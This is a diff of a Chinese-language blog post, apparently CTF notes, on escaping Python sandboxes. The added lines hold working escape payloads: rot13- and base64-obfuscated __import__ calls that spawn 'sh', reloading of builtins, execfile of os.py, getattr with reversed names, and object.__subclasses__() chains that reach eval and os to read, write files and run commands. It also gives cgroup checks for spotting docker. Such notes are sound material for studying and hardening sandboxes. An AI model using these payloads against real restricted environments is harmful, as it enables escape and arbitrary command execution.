@@ -244,6 +244,10 @@
             
             <h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p>
 <p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p>
+<h2 id="关于查看目标主机是否为docker"><a href="#关于查看目标主机是否为docker" class="headerlink" title="关于查看目标主机是否为docker"></a>关于查看目标主机是否为docker</h2><ol>
+<li>cat /proc/self/cgroup</li>
+<li>mount -v</li>
+</ol>
 <h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0">
 <li><strong>import</strong> 函数</li>
 </ol>
@@ -274,11 +278,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>
 <p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure>
-<ol start="6">
-<li>Filetype 函数 from types 模块</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>
-<p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p>
 <ol start="7">
 <li>commands 模块</li>
 </ol>
@@ -301,14 +300,77 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure>
 <p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ol>
+<li>file 函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>open 函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><p>codecs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;test.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Filetype 函数 from types 模块</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>
+<p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p>
 <p>关于python内部查看版本号，可以使用sys模块</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure>
-<h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><ol>
-<li>加解密绕过</li>
+<h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><p>使用内联函数：</p>
+<ol>
+<li><strong>import</strong>函数</li>
+</ol>
+<p><strong>import</strong>函数本身是用来动态的导入模块，比如：<strong>import</strong>(module) == import module</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(&quot;bf&quot;.decode(&apos;rot_13&apos;))       //os </span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure>
+<p>importlib库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">a = importlib.import_module(&quot;bf&quot;.decode(&apos;rot_13&apos;))    //os</span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li><strong>builtins</strong>函数</li>
 </ol>
 <p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure>
 <p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p>
+<p>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”],我们就可以用一些编码来绕过字符明文检测。</p>
+<p>所以可以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;sh&apos;)   == __builtins__.__dict__[_import__](&apos;os&apos;).system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>路径引入os等模块</li>
+</ol>
+<p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是  sys.modules[‘os’]=None</p>
+<p>而因为一般的类unix系统的python os路径都是/usr/lib/python2.7/os.py  ,所以可以通过路径引入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>reload</li>
+</ol>
+<p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&apos;__import__&apos;]</span><br></pre></td></tr></table></figure></p>
+<p>这样就无法再引入，但是我们可以用 reload(<strong>builtins</strong>) 重载<strong>builtins</strong>模块恢复内置函数</p>
+<p>但是reload本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p>
+<p>在可以引用包的情况下，我们还可以使用imp模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import __builtins__</span><br><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>
+<p>这样就可以得到完整的<strong>builtins</strong>模块了，需要注意的是需要先import <strong>builtins</strong> ,如果不写的话，虽然<strong>builtins</strong>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import __builtins__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</span><br></pre></td></tr></table></figure>
+<p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>函数名字符串扫描过滤的绕过</li>
+</ol>
+<p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p>
+<p>这里就可以使用： getattr &amp;&amp; <strong>getattribute</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(&quot;os&quot;),&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">getattr(__import__(&quot;os&quot;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+<p>runoob ：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。</span><br><span class="line">如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。</span><br></pre></td></tr></table></figure></p>
+<h3 id="object-命令引入执行"><a href="#object-命令引入执行" class="headerlink" title="object 命令引入执行"></a>object 命令引入执行</h3><p>object 类中集成了很多基础函数，我们也可以用object来进行调用的操作</p>
+<p>对于字符串对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &apos;object&apos;&gt;,)</span><br></pre></td></tr></table></figure></p>
+<p>通过<strong>base</strong>方法可以获取上一层继承关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure>
+<p>通过<strong>mro</strong>方法获取继承关系</p>
+<p>所以最常见的创建object对象的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在获取之后，返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>所以可以读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br></pre></td></tr></table></figure></p>
+<p>同时写文件或执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;,&quot;w&quot;).write(&quot;1111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;jail.py&quot;).read()&apos; )</span><br></pre></td></tr></table></figure></p>
+<p>可以执行命令寻找subclasses下引入过os模块的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>参考：<br><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a><br><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>
 
         </div>
         
@@ -316,7 +378,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-04-22T12:30:32.941Z" itemprop="dateUpdated">2019-04-22 20:30:32</time>
+    Last updated: <time datetime="2019-05-09T07:55:50.603Z" itemprop="dateUpdated">2019-05-09 15:55:50</time>
 </span><br>
 
 
@@ -411,7 +473,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#python-沙盒"><span class="post-toc-number">1.</span> <span class="post-toc-text">python 沙盒</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意执行命令的一些函数和模块"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">任意执行命令的一些函数和模块</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过检查"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">绕过检查</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#import-os-引入"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">import / os 引入</span></a></li></ol></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#python-沙盒"><span class="post-toc-number">1.</span> <span class="post-toc-text">python 沙盒</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#关于查看目标主机是否为docker"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">关于查看目标主机是否为docker</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意执行命令的一些函数和模块"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">任意执行命令的一些函数和模块</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件操作"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">文件操作</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过检查"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">绕过检查</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#import-os-引入"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">import / os 引入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#object-命令引入执行"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">object 命令引入执行</span></a></li></ol></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
